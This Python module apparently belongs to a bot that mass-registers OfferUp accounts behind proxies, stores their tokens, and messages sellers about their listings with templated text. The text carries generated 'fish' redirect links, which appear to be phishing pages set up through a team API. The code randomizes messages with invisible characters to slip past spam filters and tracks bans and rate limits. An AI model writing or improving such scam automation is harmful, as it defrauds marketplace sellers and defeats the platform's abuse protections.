# app/core/offerup_account.py
import asyncio
import json
import logging
import os
from typing import Dict, Any, Optional

from faker import Faker

from app.core.offerup_api import OfferUpAPI
from app.utils.redirects import generate_fish_redirect_url, set_redirect
from app.utils.teams_api import create_fish
from app.utils.text_formatter import format_text_words, generate_random_string
from config import DEFAULT_PASTA, ACCOUNTS_DIR, SENDER_COOLDOWN_SECONDS_FOR_ACCOUNT, SENDER_DELAY_BETWEEN_MESSAGES

logger = logging.getLogger(__name__)


class OfferUpAccount:
    """
    Класс, представляющий один аккаунт OfferUp.
    Хранит все данные аккаунта, токены, настройки и состояние (например, бан).
    Не содержит логики API-запросов.
    """
    def __init__(self, email: str, password: str, proxy: str, pasta: list, filepath: Optional[str] = None, **kwargs):
        self.filepath = filepath
        self.email = email
        self.password = password
        self.proxy = proxy
        self.pasta = pasta if pasta is not None else DEFAULT_PASTA
        self.cooldown = kwargs.get('cooldown', SENDER_COOLDOWN_SECONDS_FOR_ACCOUNT)

        self.api = OfferUpAPI(
            proxy=proxy,
            session_id=kwargs.get('session_id'),
            device_id=kwargs.get('device_id'),
            advertising_id=kwargs.get('advertising_id'),
            user_agent=kwargs.get('user_agent'),
            browser_user_agent=kwargs.get('browser_user_agent'),
        )
        self.jwt_token = self.api.jwt_token = kwargs.get('jwt_token')
        self.refresh_token = self.api.refresh_token = kwargs.get('refresh_token')

        # Данные сессии и авторизации
        self.name = kwargs.get('name', Faker().user_name())
        self.cookies = kwargs.get('cookies', {})
        self.user_id = kwargs.get('user_id')
        self.user_context = kwargs.get('user_context', {})
        self.anymessage_email_id = kwargs.get('anymessage_email_id')

        # Характеристики аккаунта
        self.banned = False
        self.unauthorized = False
        self.unverified = False
        self.limit_reached = False
        self.processed = 0

    def to_dict(self) -> Dict[str, Any]:
        """
        Преобразует объект аккаунта в словарь для сохранения в JSON.
        """
        return {
            "email": self.email,
            "password": self.password,
            "proxy": self.proxy,
            "pasta": self.pasta,
            "cookies": self.cookies,
            "jwt_token": self.jwt_token,
            "refresh_token": self.refresh_token,
            "user_id": self.user_id,
            "user_context": self.user_context,
            "anymessage_email_id": self.anymessage_email_id,
            "session_id": self.api.session_id,
            "device_id": self.api.device_id,
            "advertising_id": self.api.advertising_id,
            "user_agent": self.api.user_agent,
            "browser_user_agent": self.api.browser_user_agent,
        }

    def save_to_file(self):
        if not self.filepath:
            # Используем email как имя файла, экранируя недопустимые символы
            filename = f"{self.email.replace('@', '_at_').replace('.', '_dot_')}.json"
            self.filepath = os.path.join(ACCOUNTS_DIR, filename)
        try:
            with open(self.filepath, 'w', encoding='utf-8') as f:
                json.dump(self.to_dict(), f, ensure_ascii=False, indent=4)
            logger.debug(f"Файл аккаунта сохранён: {self.filepath}")
        except Exception as e:
            logger.error(f"Ошибка при сохранении файла аккаунта {self.filepath}: {e}")

    @staticmethod
    def load_from_file(filepath: str) -> Optional['OfferUpAccount']:
        """
        Загружает аккаунт из JSON-файла.
        """
        try:
            with open(filepath, "r", encoding='utf-8') as f:
                file_data = json.load(f)
            return OfferUpAccount(filepath=filepath, **file_data)
        except FileNotFoundError:
            logger.error(f"Файл по пути {filepath} не найден!")
            return None
        except json.decoder.JSONDecodeError:
            logger.error(f"Файл {filepath} содержит не JSON!")
            return None
        except Exception as e:
            logger.error(f"Неожиданная ошибка {e.__class__.__name__} при загрузке аккаунта из файла {filepath}: {e}")
            return None

    def delete_file(self):
        """Удаляет файл JSON аккаунта с диска."""
        try:
            if os.path.exists(self.filepath):
                os.remove(self.filepath)
                logger.debug(f"Файл аккаунта удалён: {self.filepath}")
            else:
                logger.warning(f"Файл аккаунта не найден для удаления: {self.filepath}")
        except Exception as e:
            logger.error(f"Ошибка при удалении файла аккаунта {self.filepath}: {e}")

    async def register(self):
        try:
            logger.debug("Отправка запроса на регистрацию...")
            signup_response = await self.api.signup(email=self.email, name=self.name, password=self.password)
            if signup_response is None or 'errors' in signup_response:
                logger.error(f"Ошибка регистрации для {self.email}: {signup_response}")
                return False

            signup_data = signup_response['data']['signup']
            self.user_id = str(signup_data['id'])
            self.jwt_token = self.api.jwt_token = signup_data['sessionToken']['value']
            self.refresh_token = self.api.refresh_token = signup_data['refreshToken']['value']
            self.cookies = [
                {
                    "domain": "offerup.com",
                    "hostOnly": True,
                    "httpOnly": False,
                    "name": "jwt_token",
                    "path": "/",
                    "sameSite": None,
                    "secure": False,
                    "session": True,
                    "storeId": None,
                    "value": self.jwt_token,
                },
                {
                    "domain": "offerup.com",
                    "hostOnly": True,
                    "httpOnly": False,
                    "name": "refresh_token",
                    "path": "/",
                    "sameSite": None,
                    "secure": False,
                    "session": True,
                    "storeId": None,
                    "value": self.refresh_token,
                }
            ]

            if not self.jwt_token or not self.refresh_token or not self.user_id:
                logger.error(f"Не все токены/ID получены при регистрации {self.email}.")
                return False

            logger.debug(f"Регистрация {self.email} успешна. Получены токены и user_id.")
            return True

        except Exception as e:
            logger.error(f"Ошибка при регистрации или инициации верификации email для {self.email}: {e}")
            return False

    def is_response_errors_contain(self, response_text: Optional[dict]) -> bool:
        errors_contain = False
        if response_text is None:
            errors_contain = True
        elif 'errors' in response_text:
            errors_contain = True
            for error in response_text.get('errors', []):
                if not error:
                    continue
                if error.get("title") == "Verification Required":
                    self.unverified = True
                elif error.get("message") == "Request failed with status code 400":
                    error_title = error.get("extensions", {}).get("exception", {}).get("originalError", {}).get("error", {}).get("title")
                    if error_title and error_title in ("Verification Required", "Verify your phone to continue"):
                        self.unverified = True
                    elif error_title == "Request challenged":
                        self.banned = True
                elif error.get("message") == "Request failed with status code 401":
                    self.unauthorized = True
                elif error.get("message") == "Request failed with status code 429":
                    self.limit_reached = True
        return errors_contain

    async def process_ad(self, ad: dict) -> bool:
        ad_id = ad["listingId"]
        fish_redirect = None
        try:
            discussion_id = None
            for msg_num, msg_text in enumerate(self.pasta.copy(), start=1):
                if "{fish}" in msg_text:
                    fish_redirect = generate_fish_redirect_url()
                    msg_text.replace("{fish}", fish_redirect)

                msg_text = msg_text.format(
                    title = ad["title"],
                    price = ad["price"],
                    owner_name = ad["owner"]["profile"]["name"],
                )
                # Рандомизируем невидимым символом
                msg_text = format_text_words(msg_text)

                logger.debug(f"Отправляем {msg_num} сообщение '{msg_text}' по объявлению {ad_id}...")
                if msg_num == 1:
                    post_first_message_response = await self.api.post_first_message(listing_id=ad_id, text=msg_text)
                    logger.debug(f"Содержимое ответа на отправку первого сообщения: {post_first_message_response}")
                    if self.is_response_errors_contain(post_first_message_response):
                        logger.error(f"Ошибка при отправке первого сообщения: {post_first_message_response}")
                        return False

                    if post_first_message_response is not None:
                        if post_first_message := post_first_message_response.get('data', {}).get('postFirstMessage', {}):
                            if discussion_id := post_first_message.get('discussionId'):
                                logger.debug(f"Сообщение успешно отправлено, создан чат с ID: {discussion_id}.")
                                continue

                else:
                    if not discussion_id:
                        logger.info(f"Первое сообщение не вернуло discussionId.")
                        return False

                    await asyncio.sleep(SENDER_DELAY_BETWEEN_MESSAGES)

                    post_message_response = await self.api.post_message(discussion_id, msg_text)
                    if self.is_response_errors_contain(post_message_response):
                        logger.error(f"Ответ на отправку сообщения в чат содержит ошибки: {post_message_response}")
                        return False

                    logger.debug(f"Сообщение {msg_num} отправлено успешно!")
                    continue

            if fish_redirect is not None:
                if fish := await create_fish(ad):
                    await set_redirect(fish, fish_redirect.split("/")[-1])

            logger.debug(f"Объявление {ad_id} успешно обработано!")
            return True

        except Exception as e:
            logger.exception(f"Ошибка при отправке сообщения по объявлению {ad_id}: {e}")
            return False

